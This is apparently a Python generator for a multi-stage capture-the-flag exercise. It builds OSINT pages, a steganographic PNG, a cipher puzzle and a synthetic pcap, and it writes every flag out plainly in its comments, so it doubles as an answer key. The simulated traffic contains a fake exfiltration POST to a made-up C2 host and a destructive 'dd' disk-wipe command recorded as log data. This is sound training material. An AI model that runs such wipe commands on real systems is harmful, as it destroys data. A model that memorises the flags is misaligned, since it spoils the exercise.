import os
import struct
import zlib
import base64
import hashlib
import random
import io
import tarfile
import gzip

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CHALLENGES_DIR = os.path.join(BASE_DIR, "challenges")
FRONTEND_PUBLIC_ARTIFACTS = os.path.join(BASE_DIR, "ctf-platform-frontend", "public", "artifacts")
FRONTEND_PUBLIC_OSINT = os.path.join(BASE_DIR, "ctf-platform-frontend", "public", "osint")
BACKEND_STATIC_ARTIFACTS = os.path.join(BASE_DIR, "ctf-platform-backend", "src", "main", "resources", "static", "artifacts")
BACKEND_STATIC_OSINT = os.path.join(BASE_DIR, "ctf-platform-backend", "src", "main", "resources", "static", "osint")

for p in [
    os.path.join(CHALLENGES_DIR, "stage1-osint"),
    os.path.join(CHALLENGES_DIR, "stage2-stego"),
    os.path.join(CHALLENGES_DIR, "stage3-crypto"),
    os.path.join(CHALLENGES_DIR, "stage4-web"),
    os.path.join(CHALLENGES_DIR, "stage5-network"),
    os.path.join(CHALLENGES_DIR, "stage6-forensics"),
    os.path.join(CHALLENGES_DIR, "stage7-re"),
    os.path.join(CHALLENGES_DIR, "stage8-capstone"),
    # Legacy dirs for backward compatibility
    os.path.join(CHALLENGES_DIR, "stage1-stego"),
    os.path.join(CHALLENGES_DIR, "stage2-crypto"),
    os.path.join(CHALLENGES_DIR, "stage3-web"),
    os.path.join(CHALLENGES_DIR, "stage4-network"),
    os.path.join(CHALLENGES_DIR, "stage5-forensics"),
    os.path.join(CHALLENGES_DIR, "stage6-capstone"),
    FRONTEND_PUBLIC_ARTIFACTS,
    FRONTEND_PUBLIC_OSINT,
    BACKEND_STATIC_ARTIFACTS,
    BACKEND_STATIC_OSINT
]:
    os.makedirs(p, exist_ok=True)

manifest = {}

def record_manifest(name, data):
    sha = hashlib.sha256(data).hexdigest()
    manifest[name] = {"size": len(data), "sha256": sha}
    return sha

# -------------------------------------------------------------
# Stage 1: OSINT / Reconnaissance
# Flag: CTF{0s1nt_f00tpr1nt_d1sc0v3r3d}
# Fragment 1 in profile.html comment: CTF{0s1nt_
# Fragment 2 in forum.html signature: f00tpr1nt_d1sc0v3r3d}
# -------------------------------------------------------------
def make_osint():
    profile_html = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HexaTech Staff Directory // Marcus Vance</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f172a; color: #f8fafc; padding: 2rem; }
    .card { max-width: 650px; margin: 0 auto; background: #1e293b; border-radius: 12px; border: 1px solid #334155; padding: 2rem; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
    h1 { color: #38bdf8; margin-top: 0; }
    .badge { display: inline-block; padding: 0.25rem 0.75rem; border-radius: 9999px; background: #0369a1; color: white; font-size: 0.8rem; font-family: monospace; }
    .detail { margin: 1rem 0; border-bottom: 1px solid #334155; padding-bottom: 0.5rem; }
    .label { font-size: 0.75rem; color: #94a3b8; text-transform: uppercase; font-weight: bold; }
    .val { font-size: 1.1rem; color: #e2e8f0; margin-top: 0.25rem; font-family: monospace; }
  </style>
</head>
<body>
  <!-- RECONNAISSANCE AUDIT LOG: Marcus Vance public employee record -->
  <!-- Token Fragment 1: CTF{0s1nt_ -->
  <div class="card">
    <div style="display:flex; justify-content:space-between; align-items:center;">
      <h1>Marcus Vance</h1>
      <span class="badge">ACTIVE STAFF</span>
    </div>
    <div class="detail"><div class="label">Employee ID</div><div class="val">MV-4092</div></div>
    <div class="detail"><div class="label">Department</div><div class="val">HexaTech Core Grid Infrastructure (Substation Alpha-9)</div></div>
    <div class="detail"><div class="label">Role / Clearance</div><div class="val">Principal Infrastructure & SCADA Systems Architect (Level 4)</div></div>
    <div class="detail"><div class="label">Public Tech Handle</div><div class="val">@mv_infra_lead</div></div>
    <div class="detail"><div class="label">Assigned Workstation</div><div class="val">HEX-WS-VANCE-04 (Grid Terminal Delta)</div></div>
    <div class="detail"><div class="label">Notes</div><div class="val" style="font-family:sans-serif; font-size:0.95rem; color:#cbd5e1;">Responsible for emergency halt automation protocols and Substation Alpha-9 perimeter gateway services. Active contributor to internal power-grid Linux kernel modules and developer forums.</div></div>
  </div>
</body>
</html>
"""

    forum_html = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PowerTech Energy Forums // Thread #8921</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #090d16; color: #e2e8f0; padding: 2rem; }
    .post { max-width: 750px; margin: 0 auto; background: #131c2e; border: 1px solid #233554; border-radius: 8px; padding: 1.5rem; margin-bottom: 1.5rem; }
    .author { font-weight: bold; color: #06b6d4; font-family: monospace; }
    .date { color: #64748b; font-size: 0.8rem; margin-bottom: 1rem; }
    .body { line-height: 1.6; font-size: 0.95rem; color: #cbd5e1; }
    .sig { margin-top: 1.5rem; padding-top: 1rem; border-top: 1px dashed #334155; font-size: 0.85rem; color: #94a3b8; font-family: monospace; }
  </style>
</head>
<body>
  <div class="post">
    <div style="font-size:1.25rem; font-weight:bold; color:#f8fafc; margin-bottom:0.5rem;">[Lost & Found] Dropped Access Badge near Substation Alpha-9 Turnstile</div>
    <div class="author">Posted by: @mv_infra_lead (Marcus Vance)</div>
    <div class="date">August 13, 2026 at 21:18 UTC</div>
    <div class="body">
      Hey everyone, quick heads up to the facilities team on duty tonight — I seem to have dropped my physical staff access badge (<code>evidence_badge.png</code>) right outside the Alpha-9 turnstiles when heading out to inspect the grid capacitor banks.<br><br>
      Security desk confirmed they picked it up and logged it into the physical evidence lockbox. Please do not re-encode it, as I need the RFID chip intact for tomorrow morning's perimeter gateway deployment.<br><br>
      Thanks,<br>
      Marcus
    </div>
    <div class="sig">
      ---<br>
      Marcus Vance | Principal SCADA Architect @ HexaTech<br>
      "Verification Token Part 2: f00tpr1nt_d1sc0v3r3d} (Assembly Directive: Part 1 + Part 2)"<br>
      GPG Key ID: 0x9924B10C | PGP Fingerprint: 4092-MV-AEGIS-SEC
    </div>
  </div>
</body>
</html>
"""

    for target_dir in [
        os.path.join(CHALLENGES_DIR, "stage1-osint"),
        FRONTEND_PUBLIC_OSINT,
        BACKEND_STATIC_OSINT
    ]:
        with open(os.path.join(target_dir, "profile.html"), "w", encoding="utf-8") as f:
            f.write(profile_html)
        with open(os.path.join(target_dir, "forum.html"), "w", encoding="utf-8") as f:
            f.write(forum_html)

    # Read the current index.html
    index_path = os.path.join(FRONTEND_PUBLIC_OSINT, "index.html")
    if os.path.exists(index_path):
        with open(index_path, "rb") as f:
            index_bytes = f.read()
            record_manifest("osint_index.html", index_bytes)

    record_manifest("osint_profile.html", profile_html.encode())
    record_manifest("osint_forum.html", forum_html.encode())
    print("[+] Created Stage 1 OSINT pages (index.html, profile.html & forum.html)")

# -------------------------------------------------------------
# Stage 2: Steganography - evidence_badge.png
# Flag: CTF{m3t4d4t4_r3v34ls_4ll}
# Channel Key for Stage 3: AEGIS_KEY_4092
# Decoy EXIF: Base64 Decoy
# -------------------------------------------------------------
def make_badge_png():
    width, height = 360, 180

    # Secret note to embed via LSB (least significant bit)
    secret_note = (
        b"[HEXATECH SECURITY BADGE FORENSIC EXTRACT]\n"
        b"Subject: Marcus Vance (MV-4092)\n"
        b"Role: Principal SCADA Systems Architect\n"
        b"Flag: CTF{m3t4d4t4_r3v34ls_4ll}\n"
        b"Stage 3 Channel Key: AEGIS_KEY_4092\n"
        b"Notice: Disregard decoy EXIF comment. Decrypt Stage 3 C2 transmission with Channel Key.\n\x00"
    )

    # Convert secret note to bits (MSB first)
    secret_bits = []
    for byte in secret_note:
        for bit_pos in range(7, -1, -1):
            secret_bits.append((byte >> bit_pos) & 1)

    raw_data = bytearray()
    bit_idx = 0

    for y in range(height):
        raw_data.append(0)  # PNG filter type 0 (None)
        for x in range(width):
            # Generate visual badge pattern
            if y < 14 or y > (height - 14) or x < 14 or x > (width - 14):
                r, g, b, a = 0x06, 0xb6, 0xd4, 0xff  # Cyan border
            elif 70 <= y <= 100:
                r, g, b, a = 0x0f, 0x17, 0x2a, 0xff  # Dark slate stripe
            elif 30 <= y <= 60 and 30 <= x <= 100:
                r, g, b, a = 0x38, 0xbd, 0xf8, 0xff  # ID badge photo chip
            else:
                r, g, b, a = 0x1e, 0x29, 0x3b, 0xff  # Slate card body

            # Embed bits into RGB color channels
            channels = [r, g, b]
            for c_i in range(3):
                if bit_idx < len(secret_bits):
                    channels[c_i] = (channels[c_i] & 0xfe) | secret_bits[bit_idx]
                    bit_idx += 1
            raw_data.extend([channels[0], channels[1], channels[2], a])

    def chunk(chunk_type, data):
        c = chunk_type + data
        crc = zlib.crc32(c) & 0xffffffff
        return struct.pack(">I", len(data)) + c + struct.pack(">I", crc)

    png_header = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)
    ihdr = chunk(b"IHDR", ihdr_data)
    idat = chunk(b"IDAT", zlib.compress(bytes(raw_data)))

    # Red herring / Decoy EXIF comment chunk (Base64 encoded per report specification)
    decoy_b64 = base64.b64encode(b"SuperSecretDecoy: This is a red herring. Look beyond metadata into bits.").decode()
    chunk_decoy = chunk(b"tEXt", b"Comment\x00" + decoy_b64.encode())

    iend = chunk(b"IEND", b"")

    png_bytes = png_header + ihdr + chunk_decoy + idat + iend

    for target_dir in [
        os.path.join(CHALLENGES_DIR, "stage2-stego"),
        os.path.join(CHALLENGES_DIR, "stage1-stego"),
        FRONTEND_PUBLIC_ARTIFACTS,
        BACKEND_STATIC_ARTIFACTS
    ]:
        with open(os.path.join(target_dir, "evidence_badge.png"), "wb") as f:
            f.write(png_bytes)

    record_manifest("evidence_badge.png", png_bytes)
    print(f"[+] Created Stage 2 Badge PNG ({len(png_bytes)} bytes) with LSB-embedded note and Base64 EXIF decoy")

# -------------------------------------------------------------
# Stage 3: Cryptography - intercepted_payload.txt
# Flag: CTF{c1ph3r_ch41n_d3c0d3d}
# Channel Key from Stage 2: AEGIS_KEY_4092
# Layer 1: Vigenere encryption with key AEGIS_KEY_4092
# Layer 2: Base64 encoding
# -------------------------------------------------------------
def vigenere_encrypt(plaintext, key):
    res = []
    key_clean = [c.upper() for c in key if c.isalpha()]
    k_len = len(key_clean)
    k_idx = 0
    for char in plaintext:
        if 'a' <= char <= 'z':
            shift = ord(key_clean[k_idx % k_len]) - ord('A')
            res.append(chr((ord(char) - ord('a') + shift) % 26 + ord('a')))
            k_idx += 1
        elif 'A' <= char <= 'Z':
            shift = ord(key_clean[k_idx % k_len]) - ord('A')
            res.append(chr((ord(char) - ord('A') + shift) % 26 + ord('A')))
            k_idx += 1
        else:
            res.append(char)
    return "".join(res)

def make_crypto():
    plaintext = (
        "[HEXATECH C2 BEACON TRANSMISSION // OUTBOUND BURST]\n"
        "Source: MV-4092 -> Hidden Relay Node Alpha-9\n"
        "Flag: CTF{c1ph3r_ch41n_d3c0d3d}\n"
        "Target Gateway Portal: http://localhost:8081 (Perimeter Substation Alpha-9)\n"
        "Directive: Inject boolean SQL bypass on employee login to infiltrate admin dashboard.\n"
    )
    key = "AEGIS_KEY_4092"
    vigenere_cipher = vigenere_encrypt(plaintext, key)
    b64_payload = base64.b64encode(vigenere_cipher.encode("utf-8")).decode("utf-8")

    content = f"""========================================================================
HEXATECH SIGINT DIVISION - INTERCEPT RECORD #9021-CRYPTO
Classification: CONFIDENTIAL // INCIDENT RESPONSE TEAM ONLY
Source: Hostile Egress Transmission (Relay Port 8443)
Timestamp: 2026-08-14 03:14:22 UTC
========================================================================

ANALYST LOG:
Signals intelligence intercepted an anomalous egress burst originating from 
Substation Alpha-9 moments after the perimeter breach alarm.

Telemetry indicates the adversary processed the dispatch through a multi-stage 
transformation pipeline before transmission to their hidden C2 channel.
Preliminary analysis suggests an outer transport encoding masking an inner 
keyed polyalphabetic stream. The decryption key is suspected to be held 
within the operational badge artifact recovered at the facility.

INTERCEPTED TRANSMISSION:
------------------------------------------------------------------------
{b64_payload}
------------------------------------------------------------------------

TASK:
1. Reconstruct the plaintext message.
2. Recover the security verification flag.
3. Extract the target gateway portal coordinates for the next investigation stage.
"""

    for target_dir in [
        os.path.join(CHALLENGES_DIR, "stage3-crypto"),
        os.path.join(CHALLENGES_DIR, "stage2-crypto"),
        FRONTEND_PUBLIC_ARTIFACTS,
        BACKEND_STATIC_ARTIFACTS
    ]:
        with open(os.path.join(target_dir, "intercepted_payload.txt"), "w", encoding="utf-8") as f:
            f.write(content)

    record_manifest("intercepted_payload.txt", content.encode("utf-8"))
    print("[+] Created Stage 3 Intercepted Payload (clean, no key leaks)")

# -------------------------------------------------------------
# Stage 5: Networking - incident_traffic.pcap
# -------------------------------------------------------------
# Stage 5: Networking - incident_traffic.pcap
# Flag: CTF{un3ncrypt3d_tr4ff1c_l34k}
# Table 10 Specification:
# - ~3,000 packets: DNS, HTTP, ARP, TLS decoys
# - One unencrypted HTTP upload split across TCP segments (flag)
# - Second stream confirming the workstation wipe (bridge to Stage 6)
# -------------------------------------------------------------
def make_pcap():
    magic = 0xa1b2c3d4
    version_major = 2
    version_minor = 4
    thiszone = 0
    sigfigs = 0
    snaplen = 65535
    network = 1  # Ethernet
    global_hdr = struct.pack("<IHHiIII", magic, version_major, version_minor, thiszone, sigfigs, snaplen, network)

    def checksum(msg):
        s = 0
        if len(msg) % 2 == 1:
            msg += b"\x00"
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + msg[i+1]
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        return (~s) & 0xffff

    def build_eth(src_mac, dst_mac, eth_type):
        return struct.pack("!6s6sH", src_mac, dst_mac, eth_type)

    def build_arp(sender_mac, sender_ip, target_mac, target_ip, op=1):
        eth = build_eth(sender_mac, b"\xff\xff\xff\xff\xff\xff" if op == 1 else target_mac, 0x0806)
        arp = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, op, sender_mac, sender_ip, target_mac, target_ip)
        return eth + arp

    def build_ip_udp(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, payload, ip_id=12345):
        eth = build_eth(src_mac, dst_mac, 0x0800)
        udp_len = 8 + len(payload)
        ip_total_len = 20 + udp_len
        ip_hdr_no_chk = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_total_len, ip_id, 0x4000, 64, 17, 0, src_ip, dst_ip)
        ip_chk = checksum(ip_hdr_no_chk)
        ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_total_len, ip_id, 0x4000, 64, 17, ip_chk, src_ip, dst_ip)
        udp_hdr = struct.pack("!HHHH", src_port, dst_port, udp_len, 0)
        return eth + ip_hdr + udp_hdr + payload

    def build_ip_tcp(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq, ack, flags, payload=b"", window=64240, ip_id=54321):
        eth = build_eth(src_mac, dst_mac, 0x0800)
        ip_total_len = 20 + 20 + len(payload)
        ip_hdr_no_chk = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_total_len, ip_id, 0x4000, 64, 6, 0, src_ip, dst_ip)
        ip_chk = checksum(ip_hdr_no_chk)
        ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_total_len, ip_id, 0x4000, 64, 6, ip_chk, src_ip, dst_ip)

        tcp_offset_res = (5 << 4)
        tcp_hdr_no_chk = struct.pack("!HHIIBBHHH", src_port, dst_port, seq, ack, tcp_offset_res, flags, window, 0, 0)
        pseudo_hdr = struct.pack("!4s4sBBH", src_ip, dst_ip, 0, 6, 20 + len(payload))
        tcp_chk = checksum(pseudo_hdr + tcp_hdr_no_chk + payload)
        tcp_hdr = struct.pack("!HHIIBBHHH", src_port, dst_port, seq, ack, tcp_offset_res, flags, window, tcp_chk, 0)
        return eth + ip_hdr + tcp_hdr + payload

    def make_dns_query(tx_id, domain):
        hdr = struct.pack("!HHHHHH", tx_id, 0x0100, 1, 0, 0, 0)
        qname = b""
        for part in domain.split("."):
            qname += struct.pack("!B", len(part)) + part.encode()
        qname += b"\x00"
        return hdr + qname + struct.pack("!HH", 1, 1)

    def make_dns_response(tx_id, domain, ip_bytes):
        hdr = struct.pack("!HHHHHH", tx_id, 0x8180, 1, 1, 0, 0)
        qname = b""
        for part in domain.split("."):
            qname += struct.pack("!B", len(part)) + part.encode()
        qname += b"\x00"
        qtype_qclass = struct.pack("!HH", 1, 1)
        ans = struct.pack("!HHHIH4s", 0xc00c, 1, 1, 300, 4, ip_bytes)
        return hdr + qname + qtype_qclass + ans

    gateway_mac = b"\x00\x50\x56\xe1\x82\x93"
    gateway_ip = bytes([192, 168, 1, 1])

    vance_mac = b"\x00\x0c\x29\x1a\x2b\x3c"
    vance_ip = bytes([192, 168, 1, 45])  # Workstation HEX-WS-VANCE-04

    syslog_mac = b"\x00\x50\x56\xaa\xbb\xcc"
    syslog_ip = bytes([192, 168, 1, 10])  # Log Collector

    unusual_relay_ip = bytes([198, 51, 100, 89])  # Unusual destination host

    other_hosts = [
        (b"\x00\x0c\x29\x22\x33\x44", bytes([192, 168, 1, 15])),
        (b"\x00\x0c\x29\x55\x66\x77", bytes([192, 168, 1, 20])),
        (b"\x00\x0c\x29\x88\x99\xaa", bytes([192, 168, 1, 33])),
        (b"\x00\x0c\x29\xbb\xcc\xdd", bytes([192, 168, 1, 50])),
        (b"\x00\x0c\x29\xee\xff\x00", bytes([192, 168, 1, 102]))
    ]

    decoy_domains = [
        ("api.internal.hexatech.local", bytes([192, 168, 1, 100])),
        ("auth.gateway.hexatech.local", bytes([192, 168, 1, 2])),
        ("pool.ntp.org", bytes([162, 159, 200, 1])),
        ("update.microsoft.com", bytes([20, 112, 52, 29])),
        ("telemetry.aws.internal", bytes([52, 94, 233, 112])),
        ("cdn.cloudflare.net", bytes([104, 16, 123, 96])),
        ("relay-alpha9.c2-network.net", unusual_relay_ip),
        ("monitoring.hexatech.local", bytes([192, 168, 1, 10]))
    ]

    pcap_packets = []
    current_time = 1757348400.0

    def add_pkt(pkt, dt=0.002):
        nonlocal current_time
        current_time += dt
        sec = int(current_time)
        usec = int((current_time - sec) * 1000000)
        hdr = struct.pack("<IIII", sec, usec, len(pkt), len(pkt))
        pcap_packets.append(hdr + pkt)

    # 1. ARP background sweeps
    for _ in range(80):
        src_mac, src_ip = random.choice(other_hosts)
        target_ip = bytes([192, 168, 1, random.randint(2, 250)])
        add_pkt(build_arp(src_mac, src_ip, b"\x00\x00\x00\x00\x00\x00", target_ip, op=1), dt=0.005)
        if random.random() < 0.4:
            add_pkt(build_arp(gateway_mac, target_ip, src_mac, src_ip, op=2), dt=0.001)

    # 2. Decoy DNS lookups
    for i in range(120):
        dom, ip_ans = random.choice(decoy_domains)
        tx_id = 1000 + i
        src_m, src_i = random.choice(other_hosts + [(vance_mac, vance_ip)])
        c_port = 40000 + (i % 20000)
        q = make_dns_query(tx_id, dom)
        add_pkt(build_ip_udp(src_m, gateway_mac, src_i, gateway_ip, c_port, 53, q), dt=0.002)
        r = make_dns_response(tx_id, dom, ip_ans)
        add_pkt(build_ip_udp(gateway_mac, src_m, gateway_ip, src_i, 53, c_port, r), dt=0.001)

    # 3. Decoy TLS Sessions (port 443)
    for sess in range(60):
        src_m, src_i = random.choice(other_hosts)
        dst_ip = bytes([52, random.randint(10, 100), random.randint(10, 200), random.randint(1, 250)])
        c_port = 50000 + sess
        s_port = 443
        seq_c = 10000 + sess * 5000
        seq_s = 60000 + sess * 5000

        add_pkt(build_ip_tcp(src_m, gateway_mac, src_i, dst_ip, c_port, s_port, seq_c, 0, 0x02), dt=0.001)
        add_pkt(build_ip_tcp(gateway_mac, src_m, dst_ip, src_i, s_port, c_port, seq_s, seq_c + 1, 0x12), dt=0.001)
        seq_c += 1
        seq_s += 1
        add_pkt(build_ip_tcp(src_m, gateway_mac, src_i, dst_ip, c_port, s_port, seq_c, seq_s, 0x10), dt=0.001)

        client_hello = b"\x16\x03\x03\x00\x95\x01\x00\x00\x91\x03\x03" + (b"\x11" * 135)
        add_pkt(build_ip_tcp(src_m, gateway_mac, src_i, dst_ip, c_port, s_port, seq_c, seq_s, 0x18, client_hello), dt=0.002)
        seq_c += len(client_hello)
        add_pkt(build_ip_tcp(gateway_mac, src_m, dst_ip, src_i, s_port, c_port, seq_s, seq_c, 0x10), dt=0.001)

        server_hello = b"\x16\x03\x03\x00\x55\x02\x00\x00\x51\x03\x03" + (b"\x22" * 71)
        add_pkt(build_ip_tcp(gateway_mac, src_m, dst_ip, src_i, s_port, c_port, seq_s, seq_c, 0x18, server_hello), dt=0.002)
        seq_s += len(server_hello)
        add_pkt(build_ip_tcp(src_m, gateway_mac, src_i, dst_ip, c_port, s_port, seq_c, seq_s, 0x10), dt=0.001)

        for _ in range(random.randint(4, 8)):
            app_data_c = b"\x17\x03\x03\x00\x80" + (b"\x33" * 128)
            add_pkt(build_ip_tcp(src_m, gateway_mac, src_i, dst_ip, c_port, s_port, seq_c, seq_s, 0x18, app_data_c), dt=0.002)
            seq_c += len(app_data_c)
            app_data_s = b"\x17\x03\x03\x01\x00" + (b"\x44" * 256)
            add_pkt(build_ip_tcp(gateway_mac, src_m, dst_ip, src_i, s_port, c_port, seq_s, seq_c, 0x18, app_data_s), dt=0.002)
            seq_s += len(app_data_s)

        add_pkt(build_ip_tcp(src_m, gateway_mac, src_i, dst_ip, c_port, s_port, seq_c, seq_s, 0x11), dt=0.001)
        add_pkt(build_ip_tcp(gateway_mac, src_m, dst_ip, src_i, s_port, c_port, seq_s, seq_c + 1, 0x11), dt=0.001)

    # 4. Decoy HTTP Traffic (port 80)
    decoy_uris = [
        b"GET /favicon.ico HTTP/1.1\r\nHost: intranet.hexatech.local\r\n\r\n",
        b"GET /healthz HTTP/1.1\r\nHost: cluster.hexatech.local\r\n\r\n",
        b"GET /static/styles.css HTTP/1.1\r\nHost: intranet.hexatech.local\r\n\r\n",
        b"GET /api/v1/metrics HTTP/1.1\r\nHost: monitoring.hexatech.local\r\n\r\n",
        b"GET /portal/status HTTP/1.1\r\nHost: gateway.hexatech.local\r\n\r\n",
    ]
    for h_sess in range(70):
        src_m, src_i = random.choice(other_hosts)
        dst_ip = bytes([192, 168, 1, 100])
        c_port = 45000 + h_sess
        s_port = 80
        seq_c = 20000 + h_sess * 4000
        seq_s = 70000 + h_sess * 4000

        add_pkt(build_ip_tcp(src_m, gateway_mac, src_i, dst_ip, c_port, s_port, seq_c, 0, 0x02), dt=0.001)
        add_pkt(build_ip_tcp(gateway_mac, src_m, dst_ip, src_i, s_port, c_port, seq_s, seq_c + 1, 0x12), dt=0.001)
        seq_c += 1
        seq_s += 1
        add_pkt(build_ip_tcp(src_m, gateway_mac, src_i, dst_ip, c_port, s_port, seq_c, seq_s, 0x10), dt=0.001)

        req_payload = random.choice(decoy_uris)
        add_pkt(build_ip_tcp(src_m, gateway_mac, src_i, dst_ip, c_port, s_port, seq_c, seq_s, 0x18, req_payload), dt=0.002)
        seq_c += len(req_payload)

        resp_payload = b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 13\r\n\r\nOK System Up\n"
        add_pkt(build_ip_tcp(gateway_mac, src_m, dst_ip, src_i, s_port, c_port, seq_s, seq_c, 0x18, resp_payload), dt=0.002)
        seq_s += len(resp_payload)

        add_pkt(build_ip_tcp(src_m, gateway_mac, src_i, dst_ip, c_port, s_port, seq_c, seq_s, 0x11), dt=0.001)
        add_pkt(build_ip_tcp(gateway_mac, src_m, dst_ip, src_i, s_port, c_port, seq_s, seq_c + 1, 0x11), dt=0.001)

    # 5. SUSPICIOUS STREAM: Unencrypted HTTP POST split across TCP segments (Table 10)
    # Client: 192.168.1.45:51240 -> Unusual Destination: 198.51.100.89:80
    exfil_c_port = 51240
    exfil_s_port = 80
    exfil_seq_c = 100000
    exfil_seq_s = 500000

    add_pkt(build_ip_tcp(vance_mac, gateway_mac, vance_ip, unusual_relay_ip, exfil_c_port, exfil_s_port, exfil_seq_c, 0, 0x02), dt=0.005)
    add_pkt(build_ip_tcp(gateway_mac, vance_mac, unusual_relay_ip, vance_ip, exfil_s_port, exfil_c_port, exfil_seq_s, exfil_seq_c + 1, 0x12), dt=0.002)
    exfil_seq_c += 1
    exfil_seq_s += 1
    add_pkt(build_ip_tcp(vance_mac, gateway_mac, vance_ip, unusual_relay_ip, exfil_c_port, exfil_s_port, exfil_seq_c, exfil_seq_s, 0x10), dt=0.001)

    # Segment 1: Headers and first part of JSON
    post_part1 = (
        b"POST /api/v1/telemetry/dispatch HTTP/1.1\r\n"
        b"Host: relay-alpha9.c2-network.net\r\n"
        b"User-Agent: ExfilAgent/3.1 (Aegis-Breach-Automation)\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: 428\r\n"
        b"Connection: keep-alive\r\n"
        b"\r\n"
        b"{\n"
        b"  \"source\": \"HEX-WS-VANCE-04\",\n"
        b"  \"timestamp\": \"2026-08-14T03:42:11Z\",\n"
        b"  \"node_id\": \"MV-4092\",\n"
        b"  \"telemetry_archive\": \"substation_alpha9_dump.enc\",\n"
        b"  \"status\": \"EGRESS_BURST_COMPLETE\",\n"
        b"  \"session_token\": \"s_9921_adm_token_hex\",\n"
    )
    add_pkt(build_ip_tcp(vance_mac, gateway_mac, vance_ip, unusual_relay_ip, exfil_c_port, exfil_s_port, exfil_seq_c, exfil_seq_s, 0x18, post_part1), dt=0.004)
    exfil_seq_c += len(post_part1)

    add_pkt(build_ip_tcp(gateway_mac, vance_mac, unusual_relay_ip, vance_ip, exfil_s_port, exfil_c_port, exfil_seq_s, exfil_seq_c, 0x10), dt=0.002)

    # Segment 2: Remaining body with the FLAG
    post_part2 = (
        b"  \"flag\": \"CTF{un3ncrypt3d_tr4ff1c_l34k}\",\n"
        b"  \"wipe_schedule\": \"IMMEDIATE_LOCAL_STORAGE_SCRUB\",\n"
        b"  \"destination_cluster\": \"C2-RELAY-NODE-OMEGA\",\n"
        b"  \"verification_digest\": \"d41d8cd98f00b204e9800998ecf8427e\"\n"
        b"}\n"
    )
    add_pkt(build_ip_tcp(vance_mac, gateway_mac, vance_ip, unusual_relay_ip, exfil_c_port, exfil_s_port, exfil_seq_c, exfil_seq_s, 0x18, post_part2), dt=0.003)
    exfil_seq_c += len(post_part2)

    http_resp = (
        b"HTTP/1.1 200 OK\r\n"
        b"Server: nginx/1.24.0 (Relay-Node)\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: 72\r\n"
        b"Connection: close\r\n"
        b"\r\n"
        b"{\"status\":\"ACCEPTED\",\"bytes_received\":428,\"dispatch_code\":\"DISPATCH-OK-99\"}\n"
    )
    add_pkt(build_ip_tcp(gateway_mac, vance_mac, unusual_relay_ip, vance_ip, exfil_s_port, exfil_c_port, exfil_seq_s, exfil_seq_c, 0x18, http_resp), dt=0.005)
    exfil_seq_s += len(http_resp)

    add_pkt(build_ip_tcp(gateway_mac, vance_mac, unusual_relay_ip, vance_ip, exfil_s_port, exfil_c_port, exfil_seq_s, exfil_seq_c, 0x11), dt=0.001)
    add_pkt(build_ip_tcp(vance_mac, gateway_mac, vance_ip, unusual_relay_ip, exfil_c_port, exfil_s_port, exfil_seq_c, exfil_seq_s + 1, 0x11), dt=0.001)

    # 6. SECOND TARGET STREAM: Workstation Wipe Confirmation Stream (Bridge to Stage 6)
    wipe_c_port = 51242
    wipe_s_port = 8080
    wipe_seq_c = 200000
    wipe_seq_s = 600000

    add_pkt(build_ip_tcp(vance_mac, syslog_mac, vance_ip, syslog_ip, wipe_c_port, wipe_s_port, wipe_seq_c, 0, 0x02), dt=0.004)
    add_pkt(build_ip_tcp(syslog_mac, vance_mac, syslog_ip, vance_ip, wipe_s_port, wipe_c_port, wipe_seq_s, wipe_seq_c + 1, 0x12), dt=0.002)
    wipe_seq_c += 1
    wipe_seq_s += 1
    add_pkt(build_ip_tcp(vance_mac, syslog_mac, vance_ip, syslog_ip, wipe_c_port, wipe_s_port, wipe_seq_c, wipe_seq_s, 0x10), dt=0.001)

    wipe_req = (
        b"POST /api/internal/syslog HTTP/1.1\r\n"
        b"Host: logging.hexatech.local:8080\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: 312\r\n"
        b"\r\n"
        b"{\n"
        b"  \"facility\": \"SECURITY_ALERT\",\n"
        b"  \"severity\": \"EMERGENCY\",\n"
        b"  \"hostname\": \"HEX-WS-VANCE-04\",\n"
        b"  \"action\": \"LOCAL_STORAGE_SCRUB\",\n"
        b"  \"executed_command\": \"dd if=/dev/urandom of=/dev/nvme0n1 bs=4M count=8\",\n"
        b"  \"forensics_note\": \"Workstation drive quick wipe triggered before departure. File pointers removed at unallocated cluster offset 0x8000.\"\n"
        b"}\n"
    )
    add_pkt(build_ip_tcp(vance_mac, syslog_mac, vance_ip, syslog_ip, wipe_c_port, wipe_s_port, wipe_seq_c, wipe_seq_s, 0x18, wipe_req), dt=0.004)
    wipe_seq_c += len(wipe_req)

    wipe_resp = (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: 29\r\n"
        b"\r\n"
        b"{\"logged\":true,\"id\":109482}\n"
    )
    add_pkt(build_ip_tcp(syslog_mac, vance_mac, syslog_ip, vance_ip, wipe_s_port, wipe_c_port, wipe_seq_s, wipe_seq_c, 0x18, wipe_resp), dt=0.003)
    wipe_seq_s += len(wipe_resp)

    add_pkt(build_ip_tcp(vance_mac, syslog_mac, vance_ip, syslog_ip, wipe_c_port, wipe_s_port, wipe_seq_c, wipe_seq_s, 0x11), dt=0.001)
    add_pkt(build_ip_tcp(syslog_mac, vance_mac, syslog_ip, vance_ip, wipe_s_port, wipe_c_port, wipe_seq_s, wipe_seq_c + 1, 0x11), dt=0.001)

